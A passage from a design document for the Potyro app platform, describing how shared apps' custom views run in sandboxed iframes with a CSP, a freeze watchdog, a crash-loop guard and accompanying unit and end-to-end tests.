  origin, are the trust boundary, and nothing else can reach a sandboxed srcdoc frame.
- **The shell's `frame-src 'none'`**, in three places that must stay in step (index.html `<meta>`,
  vite.config.ts headers, the Apache vhost). It forbids every frame that fetches; a future embed (a
  video, a map) has to name its origin there.
- **The watchdog**: deadlines that pause for questions, prompts, dialogs and fetches (an app can make
  its budget pause only by asking something of the person or the world), the 1 s heartbeat, the flood
  guard, and `RealmStartError`'s automatic fall back to QuickJS (still sealed).
- **What crosses by structured clone**: Blobs, bytes and Dates in and out; functions never; getters
  are read during the copy (a record's cycle-trap accessor makes such a reply fail closed).
- **Not capped**: a Worker's memory (§6.1), and nested Workers from `blob:` (allowed by the CSP,
  ended with the frame).
- **Out of scope now**: QuickJS's marshal and bridge, for the realm's apps; they remain for the
  fallback and for verification until phase 2.

### 10.6 Tests

- **Unit**: the untrusted contract (`untrusted-host.test.ts` and the other host suites listed in
  docs/09) runs against both runners — the realm's real worker runtime in a Node worker thread
  (`host/test/runners.ts`; not a sandbox, so containment is asserted in browsers). `realm-host.test.ts`:
  built-ins, return-then-spin, questions pausing the budget, the flood guard, raw ops, mediated fetch,
  Blobs, uncloneable values, `RealmStartError`. Shell: `missing-features.test.ts` per runner.
- **e2e**: `realm-sandbox.spec.ts` (the realm is what runs, a shared app with `Intl`/`URL`/
  `TextEncoder` works sealed, the card stops warning about built-ins and still names a page),
  `realm-escape-sandbox.spec.ts` (the escape suite with a probe server and a trusted control; storage
  not surviving into the next realm; spin and return-then-spin with the shell's own gap measured),
  `shell-csp-{sandbox,prod}.spec.ts`; and every `*-sandbox.spec.ts` now runs on the realm.
  `POTYRO_REALM_BROWSERS=1` adds a WebKit project for the realm's specs; Firefox runs every sandbox spec
  (`sandbox-firefox`, `POTYRO_FIREFOX=1`; `ci:local e2e:firefox`).

## 11. Phase 3, as shipped (2026-10-16): shared apps draw their own screens (#267)

**The decision (owner, 2026-10-16), changing §8 condition 4:** custom views of sealed apps render in
the sealed frame on **every** engine, protected against freezes, instead of only where the shell
cannot be frozen. Where the frame shares the shell's thread (Firefox, WebKit, Chromium without site
isolation, and — until the probe says otherwise — Android WebView), a view that spins blocks Potyro
for as long as it spins; the protections below bound what that can cost.

### 11.1 Where a view runs

```
 shell page ─ CustomView (views/src/custom.tsx) → RealmLoadedApp.sealedView(pageRef) → SealedViewController.mount(el, props)
   │  .k-sealed-view (the page's content area; the shell keeps the chrome and navigation)
   │     └─ <iframe sandbox="allow-scripts" srcdoc title="<app>: <page>">   ONE PER MOUNTED VIEW
   │           realm CSP · NO_WEBRTC first · view runtime (React + ReactDOM inside, `virtual:potyro-realm-view`)
   │           · the view bundle: the app's source again, `react` = the frame's own (`bundleViewSource`)
   │        ▲ its own MessagePort: ctx ops (OPS) + VIEW_OPS, pings, height, theme
   └─ RealmLoadedApp.answer(msg, channel) → route(ctx, op, args) — the logic's table, a fresh mediated ctx per op
```

- **A frame per view, not the logic frame.** Isolation: a stuck view is removed without ending the
  app's logic (its Worker keeps its state) and without freezing a second view of the same app.
  Teardown: unmounting removes the frame, and the view's document — DOM, listeners, timers, object
  URLs — goes with it, whatever the view forgot to clean up. Chromium (§4.2): every sandboxed frame of
  the page shares one renderer process anyway, so one frame or several costs the same; what matters
  there is freeing that process when a stuck view keeps it busy (§11.3).
- **The same authority as the logic, no more.** `sandbox="allow-scripts"` only — no
  `allow-same-origin`, no top navigation, no popups, no forms, no modals. A view's own `<form>` still
  works: without `allow-forms` the browser drops a submission before its `submit` event, so the view
  runtime turns a submit button's click, Enter in a field and `requestSubmit()` into that event itself
  (`formSubmitShim`, 2026-10-19 — every sealed Join box and guess field had done nothing). Nothing is
  ever submitted: the sandbox still refuses it. The realm CSP (no network,
  `connect-src 'none'`); the shell's `frame-src 'none'` stops it navigating itself; WebRTC deleted
  before any app code. `ViewProps.runtime.ctx` is `makeRealmCtx` over the view's port. The host
  answers through `answer`/`route` — the same op list, the same `mediateCaps`, values gate and
  authorship — on `props.runtime.ctx`, a fresh ctx per op, as a trusted view's `runtime.ctx` is fresh
  per access. The ctx id is the view's alone; anything else is "no such ctx". The `Runtime` members
  that are not ctx (`watchQuery`, `watchRecord` and the hooks over them, `runAction`,
  `reconcileReminders`) and the `navigate` prop are `VIEW_OPS`, accepted on a view's port only; a
  view's live connections (docs/28) have their own `SocketBridge` on its port.
- **The open app's services work from a screen.** `ui.keepAwake`, `ui.timer`/`timers` and
  `guests.*` (#369) are on the view's port too: a view's keep-awakes are held under its own names and
  released when it goes, its timers are the app's. Voice (`caps.speech.listen`) stays the logic's.
- **What is different inside.** `ctx.media.url` / `ctx.files.url`: the host sends the bytes and the
  frame makes its own `blob:` URL (the shell's do not load in an opaque origin). `runtime.definition`
  is the localized definition as data. `ctx.caps.camera.live` is not there — it stays trusted-only
  for now (Mirror Monsters is a follow-up).
- **Layout.** The frame is as wide as the content area and exactly as tall as the room below it
  (the window's height less its top and `--k-chrome-bottom`, at least 320 px): a stage app (a game)
  gets the whole room, and a taller view scrolls inside its frame. An earlier cut grew the frame to
  the view's height so the shell's page scrolled instead; that put a bar the view fixes to its own
  bottom (Workout's Finish) below the screen, out of reach. Inside the frame `--k-chrome-bottom`,
  `--k-safe-top` and `--k-safe-bottom` are 0: the frame already stops clear of the shell's bars.
- **Theme.** Every custom property where the view sits, its `color-scheme`, font and ink, at mount and
  again when the theme, the colour scheme or the app's accent changes; a few rules (`.k-add`,
  `.k-muted`, `.k-primary-action`) make a view written against the shell's classes look native.
- **Input and focus.** Pointer, touch and keys go to the frame as to any iframe; the frame has a
  title (the app's and the page's names); Tab enters and leaves it.

### 11.2 Freezes: the watchdog and the crash-loop guard

| | Threshold | What happens |
|---|---|---|
| Ping unanswered (the frame runs apart and is stuck: desktop Chromium) | **2 s** (pings every 250 ms) | the frame is removed; the page shows the app's **plain version** |
| The page's own check ran late while a view showed (the frame shares the thread and blocked it) | **2 s** late (checks every 100 ms) | the same, the moment the loop lets go |
| Mount (bundle evaluated, first render) | 10 s | the same |
| Page hidden | — | nothing counts while hidden (timers are throttled). The watchdog is told on `visibilitychange` itself, not at its next check: a tab Android puts behind the camera runs no check at all while hidden, and the first check after it comes back is late by the whole photo (the owner's Firefox, 2026-10-20) |
| More than 4,000 messages in 100 ms | — | treated as silent |

The plain version is a calm status, never an error: "This app's screen stopped responding, so Potyro
is showing its plain version.", buttons for the app's other pages, and **Try its screen again**. A
stop also turns that app's views **off on this device** (`localStorage["potyro:sealed-view:off"]`):
a screen that froze Potyro once does not do it again by itself.

**The crash-loop guard** (`view-guard.ts`) covers the loop that never yields, which nothing in a
shared-thread tab can stop: before a view mounts, `potyro:sealed-view:mounting:<load>:<n>` is written
synchronously; while the view answers its pings the marker is refreshed every second; it is removed on
a clean unmount, on `pagehide` when the view is healthy, and while the page is hidden with the view
healthy (a phone killing a backgrounded app is not a crash). At every mount — and so when Potyro
starts — a marker of another page load not refreshed for **3 s** means that tab froze or died with
the view on screen: that app's views go off, and the next start opens its plain version. An endless
loop can therefore freeze Potyro **at most once per app**.

### 11.3 Chromium's shared process

Measured in §4.2: with a second realm alive, a killed spinning view kept its renderer process busy,
freezing every other sandboxed frame. With a frame per view, the app's own logic frame is that second
realm. So after a **silent** stop (the frame was out of process), the host pings every live logic
frame on its control port (`FRAME_SOURCE` answers `ping`); if one does not answer within 1 s, the
stopped view still holds the process, and **every realm is restarted** (`releaseSharedProcess`): the
process has no frame left and exits, and each realm starts fresh on its next call (40–60 ms). The
endless-loop spec proves it: without the escalation the next view never mounts.

### 11.4 What stays as it was, and what is deferred

- **The QuickJS fallback** and **the Studio's preview** (QuickJS until phase 2) cannot run views:
  the page says the screen runs only as yours and offers the trust dialog. In a **demo link** —
  nothing installed, nothing to promote — that button leads to **Keep this app** first.
- **Deferred:** `ctx.caps.camera.live` in sealed views; a library that touches `document` at load
  still breaks the logic Worker (the same bundle runs there), so such an app opens only as yours —
  unless the app imports it where it draws, `await import(url)` in the view's mount, as Photo Garden
  does with p5 (#388): the bundle carries the library, locked as any import by URL, and the Worker
  never runs it;
  views in the Worker (OffscreenCanvas / remote DOM), should the Android probe show WebView frames
  freeze the shell and that matter in practice; the view runtime (276 KB minified, React and the
  schema `format.ts` pulls in) could be trimmed.

### 11.5 For the #14 audit

New surface: the view port (`VIEW_OPS`, the view ctx id, `SealedViewController`'s message handler, its
flood guard), `view-runtime.ts` (untrusted like the worker runtime: app code shares its realm), the
view frame's srcdoc (`viewDocument`, runtime inlined with `</script` escaped), the bytes the host
fetches for a view's `blob:`/`data:` URLs, and the guard's localStorage keys (written only by the
shell).

### 11.6 Tests

- **Unit:** `host/test/sealed-views.test.ts` (the watchdog's thresholds and forgiveness, the guard's
  markers, staleness and storage failures, a view's `create` and the logic's landing identically
  stamped and gated, the op lists and ctx ids, `sealedView` per page, the escalation);
  `views/test/sealed-view.test.tsx` (mount and teardown, the plain version, off, retry, a throwing view).
- **e2e** (Chromium headless shell, full Chromium `channel: "chromium"`, Firefox, WebKit):
  `sealed-views-sandbox.spec.ts` (DOM, canvas pixels, taps and keys, a write landing in the store, the
  theme light and dark; the adversarial screen against a probe server; a 3 s spin → plain version and
  back; an endless loop on full Chromium with the process freed; a stale marker → plain version until
  asked), `sealed-views-breakout-sandbox.spec.ts` (Breakout added sealed from its package plays at
  1280 and 412 px: its board's pixels, Space, P and the pointer),
  `sealed-views-probe-sandbox.spec.ts` (the device check), `recipes-sandbox.spec.ts` (the cook-along
  sealed), `add-app-trusted.spec.ts` and `demo-link-trusted.spec.ts` (the words, and the demo's Keep).
